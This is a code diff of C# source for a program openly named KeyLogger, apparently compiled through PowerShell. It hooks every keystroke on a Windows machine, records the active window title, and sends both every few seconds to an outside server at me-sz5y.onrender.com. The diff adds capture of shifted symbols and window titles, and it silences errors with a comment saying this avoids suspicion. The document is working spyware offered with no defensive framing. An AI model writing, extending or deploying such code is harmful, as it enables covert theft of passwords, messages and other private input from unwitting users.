@@ -7,32 +7,31 @@ using System.Windows.Forms;
 using System.Text;
 using System.Net;
 using System.Threading;
+using System.Collections.Generic;
 
 namespace KeyLogger {
   public static class Program {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
-
-    // To hold the current word being typed
+    
+    // Add Window Title Detection
+    private const int GW_HWNDNEXT = 2;
+    private const int WM_GETTEXT = 0x000D;
     private static string currentWord = "";
-
+    private static string currentWindowTitle = "";
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
-
-    // Timer to periodically send captured words to the server (using System.Threading.Timer)
-    private static System.Threading.Timer sendTimer;  // Fully qualified Timer
+    
+    private static System.Threading.Timer sendTimer;
     private static object lockObject = new object();
-
+    
     public static void Main() {
       hookId = SetHook(hookProc);
-
-      // Setup a timer that sends captured words every 5 seconds
-      sendTimer = new System.Threading.Timer(SendWordsToServer, null, 0, 5000);  // Fully qualified Timer
-
+      sendTimer = new System.Threading.Timer(SendWordsToServer, null, 2000, 3000); // start after 2s, send every 3s
       Application.Run();
       UnhookWindowsHookEx(hookId);
     }
-
+    
     private static IntPtr SetHook(HookProc hookProc) {
       IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
       return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
@@ -41,36 +40,33 @@ namespace KeyLogger {
     private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
     private static void SendWordToServer(string word) {
-      try {
-        // Prepare the request body with the 'words' key
-        string jsonBody = "{ \"words\": \"" + word + "\" }";
+      ThreadPool.QueueUserWorkItem(state => {
+        try {
+          string jsonBody = "{ \"words\": \"" + word + "\", \"window_title\": \"" + currentWindowTitle + "\" }";
+          string url = "https://me-sz5y.onrender.com/captures";
+          var webRequest = WebRequest.Create(url);
+          webRequest.Method = "POST";
+          byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
+          webRequest.ContentType = "application/json";
+          webRequest.ContentLength = byteArray.Length;
 
-        // Use WebRequest to send the POST request to the server
-        string url = "https://me-sz5y.onrender.com/captures";
-        var webRequest = System.Net.WebRequest.Create(url);
-        webRequest.Method = "POST";
-        byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
-        webRequest.ContentType = "application/json";
-        webRequest.ContentLength = byteArray.Length;
+          using (Stream dataStream = webRequest.GetRequestStream()) {
+            dataStream.Write(byteArray, 0, byteArray.Length);
+          }
 
-        using (Stream dataStream = webRequest.GetRequestStream()) {
-          dataStream.Write(byteArray, 0, byteArray.Length);
+          var response = webRequest.GetResponse();
+          response.Close();
+        } catch {
+          // Silently ignore to avoid suspicion
         }
-
-        var response = webRequest.GetResponse();
-        response.Close();
-      }
-      catch (Exception ex) {
-        Console.WriteLine("Error sending to server: " + ex.Message);
-      }
+      });
     }
 
     private static void SendWordsToServer(object state) {
       lock (lockObject) {
         if (!string.IsNullOrEmpty(currentWord)) {
-          // Send the current word to the server and reset the word buffer
           SendWordToServer(currentWord);
-          currentWord = "";  // Reset for the next word
+          currentWord = "";
         }
       }
     }
@@ -79,53 +75,61 @@ namespace KeyLogger {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
         int vkCode = Marshal.ReadInt32(lParam);
         Keys key = (Keys)vkCode;
+        bool isShift = (Control.ModifierKeys & Keys.Shift) != 0;
 
-        // Skip modifier keys like Shift, Ctrl, Alt, etc.
-        if (key == Keys.Shift || key == Keys.ControlKey || key == Keys.Menu || key == Keys.LShiftKey || key == Keys.RShiftKey) {
+        if (key == Keys.Shift || key == Keys.ControlKey || key == Keys.Menu) {
           return CallNextHookEx(hookId, nCode, wParam, lParam);
         }
 
-        string keyText = key.ToString().ToLower();
+        string keyText = "";
 
-        // Handle numbers and special characters correctly
-        if (key >= Keys.D0 && key <= Keys.D9) {
-          keyText = key.ToString().Replace("D", "");  // Remove the 'D' from D0, D1, etc.
+        // Detect active window title
+        currentWindowTitle = GetActiveWindowTitle();
+
+        Dictionary<int, string> normalSymbols = new Dictionary<int, string> {
+          { 0xBA, ";" }, { 0xBB, "=" }, { 0xBC, "," }, { 0xBD, "-" },
+          { 0xBE, "." }, { 0xBF, "/" }, { 0xC0, "`" }, { 0xDB, "[" },
+          { 0xDC, "\\" }, { 0xDD, "]" }, { 0xDE, "'" }
+        };
+
+        Dictionary<int, string> shiftSymbols = new Dictionary<int, string> {
+          { 0x31, "!" }, { 0x32, "@" }, { 0x33, "#" }, { 0x34, "$" },
+          { 0x35, "%" }, { 0x36, "^" }, { 0x37, "&" }, { 0x38, "*" },
+          { 0x39, "(" }, { 0x30, ")" }, { 0xBA, ":" }, { 0xBB, "+" },
+          { 0xBC, "<" }, { 0xBD, "_" }, { 0xBE, ">" }, { 0xBF, "?" },
+          { 0xC0, "~" }, { 0xDB, "{" }, { 0xDC, "|" }, { 0xDD, "}" },
+          { 0xDE, "\"" }
+        };
+
+        if (key >= Keys.A && key <= Keys.Z) {
+          keyText = isShift ? key.ToString() : key.ToString().ToLower();
+        }
+        else if (key >= Keys.D0 && key <= Keys.D9) {
+          keyText = isShift && shiftSymbols.ContainsKey(vkCode)
+            ? shiftSymbols[vkCode]
+            : key.ToString().Replace("D", "");
         }
         else if (key >= Keys.NumPad0 && key <= Keys.NumPad9) {
-          keyText = key.ToString().Replace("NumPad", ""); // Handle numpad keys as well
+          keyText = key.ToString().Replace("NumPad", "");
         }
-        // Handle specific key codes directly
-        else if (vkCode == 0xBB) { // '+' key (OemPlus virtual key code)
-          keyText = "+";
+        else if (vkCode == 0x20) {
+          keyText = " ";
         }
-        else if (vkCode == 0xBD) { // '-' key (OemMinus virtual key code)
-          keyText = "-";
-        }
-        else if (vkCode == 0xBE) { // '.' key (OemPeriod virtual key code)
-          keyText = ".";
-        }
-        else if (vkCode == 0xC0) { // '`' key (OemTilde virtual key code)
-          keyText = "`";
-        }
-
-        // Check for space, backspace, or other valid keys
-        if (key == Keys.Space) {
-          if (!string.IsNullOrEmpty(currentWord)) {
-            lock (lockObject) {
-              currentWord += " ";  // Add space when spacebar is pressed
-            }
-          }
-        }
-        else if (key == Keys.Back) {
-          // If Backspace is pressed, remove the last character from the current word
+        else if (vkCode == 0x08) {
           if (currentWord.Length > 0) {
             lock (lockObject) {
               currentWord = currentWord.Substring(0, currentWord.Length - 1);
             }
           }
         }
-        else {
-          // Add the valid character to the current word
+        else if (isShift && shiftSymbols.ContainsKey(vkCode)) {
+          keyText = shiftSymbols[vkCode];
+        }
+        else if (normalSymbols.ContainsKey(vkCode)) {
+          keyText = normalSymbols[vkCode];
+        }
+
+        if (!string.IsNullOrEmpty(keyText)) {
           lock (lockObject) {
             currentWord += keyText;
           }
@@ -133,6 +137,14 @@ namespace KeyLogger {
       }
 
       return CallNextHookEx(hookId, nCode, wParam, lParam);
+    }
+
+    private static string GetActiveWindowTitle() {
+      IntPtr hwnd = GetForegroundWindow();
+      int length = GetWindowTextLength(hwnd);
+      StringBuilder windowTitle = new StringBuilder(length + 1);
+      GetWindowText(hwnd, windowTitle, windowTitle.Capacity);
+      return windowTitle.ToString();
     }
 
     [DllImport("user32.dll")]
@@ -146,6 +158,15 @@ namespace KeyLogger {
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll")]
+    private static extern int GetWindowTextLength(IntPtr hwnd);
+
+    [DllImport("user32.dll")]
+    private static extern int GetWindowText(IntPtr hwnd, StringBuilder lpString, int nMaxCount);
   }
 }
 "@ -ReferencedAssemblies System.Windows.Forms
